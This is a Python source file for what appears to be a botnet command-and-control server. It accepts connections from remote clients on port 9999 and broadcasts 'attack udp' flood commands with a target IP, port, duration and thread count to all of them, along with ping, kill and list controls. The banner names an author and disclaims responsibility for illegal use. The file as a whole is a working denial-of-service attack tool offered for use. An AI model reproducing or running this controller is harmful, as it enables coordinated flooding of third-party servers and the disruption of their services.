from threading import Thread
from time import sleep
import ctypes, socket, sys
import platform, signal
from random import choice
from typing import Union, Tuple


class Colours:
    def __init__(self):
        if platform.system() == 'Windows':
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        COMMANDS = {
            # Lables
            'info': (33, '[!] '),
            'que': (34, '[?] '),
            'bad': (31, '[-] '),
            'good': (32, '[+] '),
            'run': (97, '[~] '),
            # Colors
            'green': 32,
            'lgreen': 92,
            'lightgreen': 92,
            'grey': 37,
            'black': 30,
            'red': 31,
            'lred': 91,
            'lightred': 91,
            'cyan': 36,
            'lcyan': 96,
            'lightcyan': 96,
            'blue': 34,
            'lblue': 94,
            'lightblue': 94,
            'purple': 35,
            'yellow': 93,
            'white': 97,
            'lpurple': 95,
            'lightpurple': 95,
            'orange': 33,
            # Styles
            'bg': ';7',
            'bold': ';1',
            'italic': '3',
            'under': '4',
            'strike': '09',
        }
        for key, val in COMMANDS.items():
            value = val[0] if isinstance(val, tuple) else val
            prefix = val[1] if isinstance(val, tuple) else ''
            locals()[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)
            self.__dict__[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)

    def _gen(self, string, prefix, key):
        colored = prefix if prefix else string
        not_colored = string if prefix else ''
        result = '\033[{}m{}\033[0m{}'.format(key, colored, not_colored)
        return result


class Server(Colours):
    co = ["green", "lgreen", "lightgreen", "grey", "red", "lred", "lightred", "cyan", "lcyan", "lightcyan", "blue",
          "lblue", "lightblue", "purple", "yellow", "white", "lpurple", "lightpurple", "orange"]

    def __init__(self, connect: Tuple[str, int] = ("0.0.0.0", 9999)):
        super().__init__()
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)
        self.print_logo()
        self.all_connections = []
        self.all_address = []
        self.stop = False
        if self._bind(connect):
            while True:
                self._take_cmd()

    def exit_gracefully(self, signum: Union[str, object] = "", frame: Union[str, object] = ""):
        print("\nExiting....")
        self.stop = True
        self.sock.close()
        sleep(1)
        sys.exit(0)

    def _bind(self, connect: Tuple[str, int]) -> bool:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(connect)
        self.sock.listen(50)
        self.sock.settimeout(0.5)

        Thread(target=self.collect).start()
        Thread(target=self.check).start()

        return True

    def print_logo(self) -> None:
        x = b"\n\n\n                  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2" \
            b"\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2" \
            b"\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2" \
            b"\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96" \
            b"\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n                  " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2" \
            b"\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d     " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2" \
            b"\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95" \
            b"\x97\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90" \
            b"\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2" \
            b"\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95" \
            b"\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n                  " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d " \
            b"\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2" \
            b"\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96" \
            b"\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2" \
            b"\x95\x97     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \n                  " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   " \
            b"\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d " \
            b"\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2" \
            b"\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95" \
            b"\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2" \
            b"\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d     " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \n                  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2" \
            b"\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95" \
            b"\x9d   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 " \
            b"\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2" \
            b"\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   " \
            b"\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \n                  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d        " \
            b"\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d        " \
            b"\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  " \
            b"\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d    " \
            b"\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d   \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  " \
            b"\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2" \
            b"\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d   \n    " \
            b"                                                                                          \n            " \
            b"                 Volodymyr Revutskyi  @ github.com/havelockz\n                      Note! : We don't Accept " \
            b"any responsibility for any illegal usage.\n "
        for n in x.decode().split("\n"):
            print(self.__dict__[choice(self.co)](n))
            sleep(0.1)

    def _print_help(self):
        help = ("attack udp <ip> <port> <time in second> <thread>\nOptions:\n"
                "\tping			To check server alive or not\n"
                "\tkill			To stop all servers\n"
                "\tlist			Show online servers\n"
                "\tupdate			To update the clients list\n"
                "\texit or quit 	For quiting/exiting\n")
        print(help)

    def collect(self):
        while not self.stop:
            try:
                conn, address = self.sock.accept()
                self.all_connections.append(conn)
                self.all_address.append(address)
            except socket.timeout:
                continue
            except socket.error:
                continue
            except Exception as e:
                print("Error accepting connections")

    def _take_cmd(self):
        cmd = input("->>").strip()
        if cmd:
            if cmd == "list":
                results = ''
                for i, (ip, port) in enumerate(self.all_address):
                    results = results + self.__dict__[choice(self.co)](f'{[i]}    {ip}:{port}    CONNECTED\n')
                print("----Clients----" + "\n" + results)
            elif cmd == "help":
                self._print_help()
            elif cmd == "update":
                self.check(display=True, always=False)
            elif cmd in ["exit", "quit"]:
                self.exit_gracefully()
            elif "attack" in cmd:
                for i, (ip, port) in enumerate(self.all_address):
                    try:
                        self.all_connections[i].send(cmd.encode())
                        print(self.__dict__[choice(self.co)](
                            f'[+]    {ip}:{port}    {self.all_connections[i].recv(1024 * 5).decode("ascii")}'))
                    except BrokenPipeError:
                        del self.all_address[i]
                        del self.all_connections[i]
            elif cmd == "ping" or "kill":
                for i, (ip, port) in enumerate(self.all_address):
                    try:
                        self.all_connections[i].send(cmd.encode())
                        print(self.__dict__[choice(self.co)](
                            f'[+]    {ip}:{port}    {self.all_connections[i].recv(1024 * 5).decode("ascii")}'))
                    except BrokenPipeError:
                        del self.all_address[i]
                        del self.all_connections[i]

    def check(self, display: bool = False, always: bool = True):
        while not self.stop:
            c = 0
            for n, tcp in zip(self.all_address, self.all_connections):
                c += 1
                try:
                    tcp.send(str.encode("ping"))
                    if tcp.recv(1024).decode("utf-8") and display:
                        print(self.__dict__[choice(self.co)](f'[+]    {str(n[0]) + ":" + str(n[1])}    LIVE'))
                except:
                    if display:
                        print(self.__dict__[choice(self.co)](f'[+]    {str(n[0]) + ":" + str(n[1])}    DEAD'))
                    del self.all_address[c - 1]
                    del self.all_connections[c - 1]
                    continue
            if not always:
                break

            sleep(0.5)


if __name__ == '__main__':
    Server()
